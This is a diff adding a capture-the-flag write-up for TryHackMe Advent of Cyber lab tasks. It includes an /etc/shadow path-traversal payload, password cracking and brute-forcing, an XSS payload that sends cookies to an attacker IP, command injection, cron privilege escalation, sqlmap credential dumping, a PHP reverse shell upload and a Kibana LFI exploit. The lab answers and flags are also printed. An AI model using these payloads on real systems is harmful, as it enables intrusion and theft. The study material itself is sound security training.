@@ -680,4 +680,374 @@ directory which the website lives on?<br>
 
 ## Task 19 - [Day 14] Unknown Storage
 1. What is the name of the file you found?<br>
+    Access s3 bucket with given name.<br>
+    ![](images/54.png)<br>
+    **Answer:** employee_names.txt
+
+1. What is in the file?<br>
+    Add filename behind URL.<br>
+    ![](images/55.png)<br>
+    **Answer:** mcchef
+
+## Task 20 - [Day 15] LFI
+1. What is Charlie going to book a holiday to?<br>
+    Scan the target first.<br>
+    ```
+    $ nmap 10.10.6.252
+    Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-24 20:18 +07
+    Nmap scan report for 10.10.6.252
+    Host is up (0.21s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+
+    Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds
+    ```
+    Navigate to website, the answer is in note3.<br>
+    ![](images/56.png)<br>
+    **Answer:** Hawaii
+
+1. Read /etc/shadow and crack Charlies password.<br>
+    After trying many times with BUrp Suite, the payload for read `/etc/shadow` is `..%2f..%2f..%2fetc%2fshadow` (argument for    getNote function).<br>
+    ![](images/57.png)<br>
+    Send it to the target and receive response.<br>
+    ![](images/58.png)<br>
+    The charlie's password hash is `$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::`
+    Crack with `hashcat`, mode is 1800 (sha512crypt).<br>
+    ```
+    $ hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
+    ```
+    ![](images/59.png)<br>
+    **Answer:** password1
+
+1. What is flag1.txt?<br>
+    SSH with credential charlie:password1 then read `flag1.txt`.<br>
+    ![](images/60.png)<br>
+    **Answer:** THM{4ea2adf842713ad3ce0c1f05ef12256d}
+
+## Task 21 - [Day 16] File Confusion
+1. How many files did you extract(excluding all the .zip files)<br>
+    The solution code for this question is in [day16/q1.py](day16/q1.py).
+    ```
+    $ python3 q1.py <folder contains zip> <folder for extracting>
+    Extract done!
+    $ ls extract/extract/ | wc -l
+    50
+    ```
+    **Answer:** 50
+
+1. How many files contain Version: 1.1 in their metadata?<br>
+    The solution code for this question is in [day16/q2.py](day16/q2.py).<br>
+    ```
+    $ python3 q2 <folder contains txt file>
+    File(s) containes string Version: 1.1:
+    FH3t.txt
+    4jGg.txt
+    u63T.txt
+    Total: 3
+    ```
+    **Answer:** 3
     
+1. Which file contains the password?<br>
+    Use `grep` with argument `-r` for reading all files in current folder with string `password`.<br>
+    ```
+    $ grep -r password
+    dL6w.txt:password is 'scriptingpass'
+    ```
+    **Answer:** dL6w.txt
+
+## Task 22 - [Day 17] Hydra-ha-ha-haa
+1. Use Hydra to bruteforce molly's web password. What is flag 1? (The flag is mistyped, its THM, not TMH)<br>
+    Scan the target first.<br>
+    ```
+    $ nmap 10.10.107.255
+    Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-25 09:02 +07
+    Nmap scan report for 10.10.107.255
+    Host is up (0.21s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE
+    22/tcp open  ssh
+    80/tcp open  http
+
+    Nmap done: 1 IP address (1 host up) scanned in 5.31 seconds
+    ```
+    ![](images/61.png)<br>
+    Login to target with molly:sunshine.<br>
+    ![](images/62.png)<br>
+    **Answer:** THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+1. Use Hydra to bruteforce molly's SSH password. What is flag 2?<br>
+    ![](images/63.png)<br>
+    SSH to target with molly:butterfly.<br>
+    ![](images/64.png)<br>
+    **Answer:** THM{c8eeb0468febbadea859baeb33b2541b}
+
+## Task 23 - [Day 18] ELF JS
+1. What is the admin's authid cookie value?<br>
+    Create an account then login to website.<br>
+    ![](images/65.png)<br>
+    They annouce that admin will be comming here from time to time, our goal is perform XSS attack (Stored XSS) to steal admin's cookie.<br>
+    Try with `<script>console.log(document.location)</script>`, the target can compromis with XSS.<br>
+    ![](images/66.png)<br>
+    Create a `SimpleHTTPServer` for listening requests.<br>
+    ```
+    $ python -m SimpleHTTPServer 80
+    Serving HTTP on 0.0.0.0 port 80 ...
+    ```
+    Now research for XSS payload to steal cookie of others.<br>
+    Use payload.
+    ```JS
+    <script>window.location='http://<YOUR_IP>/?cookie='+document.cookie</script>
+    ```
+    Result.<br>
+    The first authid is mine, below is of admin.<br>
+    ![](images/67.png)<br>
+    **Answer:** 2564799a4e6689972f6d9e1c7b406f87065cbf65
+
+## Task 24 - [Day 19] Commands
+1. What are the contents of the user.txt file?<br>
+    Initerface of website, I don't find any informative thing in source web.<br>
+    ![](images/68.png)<br>
+    Based on the description of this task, he found something in `/api/cmd`, but if we directly access it on the webpage, nothing is return.<br>
+    I added `ls` command behind this endpoint and it return files and folders in `/` folder.<br>
+    ![](images/69.png)<br>
+    Conduct exploit Command Injection.<br>
+    The final payload is `cat%20%2fhome%2fbestadmin%2fuser.txt`.<br>
+    ![](images/70.png)<br>
+    **Answer:** 5W7WkjxBWwhe3RNsWJ3Q
+
+## Task 25 - [Day 20] Cronjob Privilege Escalation
+1. What port is SSH running on?<br>
+    Scan the target with `nmap` first.<br>
+    ```
+    $ nmap -sV 10.10.244.5
+    Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-30 21:34 +07
+    Nmap scan report for 10.10.244.5
+    Host is up (0.25s latency).
+    Not shown: 999 closed ports
+    PORT     STATE SERVICE VERSION
+    4567/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 31.19 seconds
+    ```
+    **Answer:** 4567
+
+1. Crack sam's password and read flag1.txt<br>
+    Use `hydra` to brute-force sam's password with `rockyou.txt`.<br>
+    ![](images/71.png)<br>
+    Use thid cred for SSH logging.<br>
+    ```
+    $ ssh -p 4567 sam@10.10.244.5
+    The authenticity of host '[10.10.244.5]:4567 ([10.10.244.5]:4567)' can't be established.
+    ED25519 key fingerprint is SHA256:K/ScJks5mDZ5nEwSJoGj+cI6kaXGOPcDZdFpnJMBI18.
+    This key is not known by any other names
+    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
+    Warning: Permanently added '[10.10.244.5]:4567' (ED25519) to the list of known hosts.
+    sam@10.10.244.5's password: 
+        .---.
+        /     \
+        \.@-@./
+        /`\_/`\
+        //  _  \\
+        | \     )|_
+    /`\_`>  <_/ \
+    \__/'---'\__/
+        tryhackme
+    Last login: Thu Dec 19 20:21:55 2019 from 89.241.198.95
+    sam@ip-10-10-244-5:~$ cat flag1.txt 
+    THM{dec4389bc09669650f3479334532aeab}
+    ```
+    **Answer:** THM{dec4389bc09669650f3479334532aeab}
+
+1. Escalate your privileges by taking advantage of a cronjob running every minute. What is flag2?<br>
+    Use `cat /etc/crontab` to see the actual scheduled task. We see that is an empty cronjob.<br>
+    ![](images/72.png)<br>
+    Use `find` command to find flag2 file, it's on ubuntu's home folder.<br>
+    ![](images/74.png)<br>
+    Check permission of this file. Only ubuntu user can read it.<br>
+    ```
+    $ ls /home/ubuntu/ -l
+    total 4
+    -r-------- 1 ubuntu ubuntu 38 Dec 19  2019 flag2.txt
+    ```
+    I try to find another file of ubuntu user. I found a script in `/home/script/` without permission denied.<br>
+    ![](images/75.png)<br>
+    This file is set `chmod 777` meaning all users have all permission on it.<br>
+    ```
+    $ ls /home/scripts/ -l
+    total 8
+    -rwxrwxrwx 1 ubuntu ubuntu 14 Dec 19  2019 clean_up.sh
+    -rw-r--r-- 1 root   root    5 Dec 19  2019 test.txt
+    ```
+    Read this file.<br>
+    ```
+    $ cat /home/scripts/clean_up.sh 
+    rm -rf /tmp/*
+    ```
+    This script remove everything in `/tmp/` folder and is a cronjob running ervery minute.<br>
+    ![](images/76.png)<br>
+    I change the script in this file into `cat /home/ubuntu/flag2.txt > /home/sam/steal.txt`.<br>
+    Wait a minute for this cronjob running.<br>
+    The result.<br>
+    ![](images/77.png)<br>
+    **Answer:** THM{b27d33705f97ba2e1f444ec2da5f5f61}
+
+## Task 26 - [Day 21] Reverse Elf-ineering
+1. What is the value of local_ch when its corresponding movl instruction is called(first if multiple)?<br>
+    Practice base on the supporting material.<br>
+    ![](images/78.png)<br>
+    **Answer:** 1
+
+1. What is the value of eax when the imull instruction is called?<br>
+    Use `ds` to execute next instruction and `dr` for display value of registers.<br>
+    ![](images/79.png)<br>
+    **Answer:** 6
+
+1. What is the value of local_4h before eax is set to 0?<br>
+    Execute next instruction.<br>
+    ![](images/80.png)<br>
+    **Answer:** 6
+
+## Task 27 - [Day 22] If Santa, Then Christmas
+1. what is the value of local_8h before the end of the main function?<br>
+    Set a breakpoint before then end of main function then view value of `local_8h` and `local_4h`<br>
+    ![](images/81.png)<br>
+    **Answer:** 9
+
+1. what is the value of local_4h before the end of the main function?<br>
+    **Answer:** 2
+
+## Task 28 - [Day 23] LapLANd (SQL Injection)
+1. Which field is SQL injectable? Use the input name used in the HTML code.<br>
+    Scan the target first.<br>
+    ```
+    $ nmap 10.10.123.242
+    Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-01 22:24 +07
+    Nmap scan report for 10.10.123.242
+    Host is up (0.24s latency).
+    Not shown: 997 closed ports
+    PORT      STATE    SERVICE
+    22/tcp    open     ssh
+    80/tcp    open     http
+    52822/tcp filtered unknown
+
+    Nmap done: 1 IP address (1 host up) scanned in 41.15 seconds
+    ```
+    Use `sqlmap` to find which parameter is vulnerable.<br>
+    ```
+    $ sqlmap -u http://10.10.239.220/register.php --forms
+    [SNIP]
+    [11:38:45] [INFO] POST parameter 'log_email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+    ```
+    **Answer:** log_email
+
+1. What is Santa Claus' email address?<br>
+    Use `sqlmap -p log_email --dbs` to get all the database name.<br>
+    ```
+    [11:45:10] [INFO] retrieved: information_schema
+    [11:49:04] [INFO] retrieved: mysql
+    [11:50:11] [INFO] retrieved: performance_schema
+    [11:53:58] [INFO] retrieved: phpmyadmin
+    [11:56:13] [INFO] retrieved: social
+    [11:57:26] [INFO] retrieved: sys
+    ```
+    Find all tables in social database with `sqlmap -p log_email -D social --tables`.<br>
+    ```
+    Database: social
+    [8 tables]
+    +-----------------+
+    | comments        |
+    | friend_requests |
+    | likes           |
+    | messages        |
+    | notifications   |
+    | posts           |
+    | trends          |
+    | users           |
+    +-----------------+
+    ```
+    Get contents of table users with `sqlmap -p log_email -D social -T users --dump`
+    ```
+    [12:27:02] [INFO] retrieved: id
+    [12:27:40] [INFO] retrieved: first_name
+    [12:31:00] [INFO] retrieved: last_name
+    [12:34:02] [INFO] retrieved: username
+    [12:36:18] [INFO] retrieved: email
+    [12:37:40] [INFO] retrieved: password
+    [12:40:20] [INFO] retrieved: signup_date
+    [12:44:06] [INFO] retrieved: profile_pic
+    [12:48:02] [INFO] retrieved: num_posts
+    [12:51:36] [INFO] retrieved: num_likes
+    [12:54:45] [INFO] retrieved: user_closed
+    [12:58:28] [INFO] retrieved: friend_array
+    ```
+    Get email and password of the table with `-C email,password`.<br>
+    ```
+    bigman@shefesh.com
+    [23:27:57] [INFO] retrieved: f1267830a78c0b59acc06b05694b2e28
+    ```
+    **Answer:** bigman@shefesh.com
+
+1. What is Santa Claus' plaintext password?<br>
+    Use [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) to crack above hash.<br>
+    ![](images/82.png)<br>
+    **Answer:** saltnpepper
+
+1. Santa has a secret! Which station is he meeting Mrs Mistletoe in?<br>
+    Login with the above credential and navigate Inbox tab.<br>
+    ![](images/83.png)<br>
+    **Answer:** Waterloo
+
+1. https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php<br>
+    Use thw wenshell from [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)<br>
+    Upload to the webserver with extension .phtml then reload the page to get reverse connection on netcat from the webserver.<br>
+    ![](images/84.png)<br>
+    The flag is in `/home/user/flag.txt`.<br>
+    **Answer:** THM{SHELLS_IN_MY_EGGNOG}
+
+## ## Task 28 - [Day 24] Elf Stalk
+1. Find the password in the database<br>
+    Use `nmap` to enumerate which ports is running on the machine.<br>
+    ```
+    $ nmap 10.10.218.146                   
+    Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-12 05:55 EDT
+    Nmap scan report for 10.10.218.146
+    Host is up (0.35s latency).
+    Not shown: 996 closed tcp ports (conn-refused)
+    PORT     STATE SERVICE
+    22/tcp   open  ssh
+    111/tcp  open  rpcbind
+    5601/tcp open  esmagent
+    8000/tcp open  http-alt
+    9200/tcp open  wap-wsp
+
+    Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
+    ```
+    I noticed to port 9200 which is the default port of Elasticsearch, so I use the following command to get all index of the database `curl -X GET "10.10.218.146:9200/_aliases?pretty=true"`
+    ```
+    $ curl -X GET "10.10.218.146:9200/_aliases?pretty=true"
+    {
+    ".kibana" : {
+        "aliases" : { }
+    },
+    "messages" : {
+        "aliases" : { }
+    }
+    }
+    ```
+    There are two indexs, i will choose the `message` index to get the first 1000 records and filter with `password` with command.<br>
+    ```
+    $ curl -X GET "http://10.10.218.146:9200/messages/_search/?size=1000&pretty" | grep -i password
+    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                    Dload  Upload   Total   Spent    Left  Speed
+    4 55290    4  2463    0     0   3487      0  0:00:15 --:--:--  0:00:15  3483          "message" : "hey, can you access my dev account for me. My username is l33tperson and my password is 9Qs58Ol3AXkMWLxiEyUyyf"
+    ```
+    **Answer:** 9Qs58Ol3AXkMWLxiEyUyyf4
+
+1. Read the contents of the /root.txt file<br>
+    Port 5601 is use for Kibana UI, I found the version is 6.4.2 which is vulnerable to Local File Inclusion (CVE-2018-17246). Send the request [http://10.10.218.146:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../root.txt](http://10.10.218.146:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../root.txt) then access the log file in port 8000, you will see the content of root.txt. <br>
+    ![](images/85.png)<br>
+    **Answer:** someELKfun
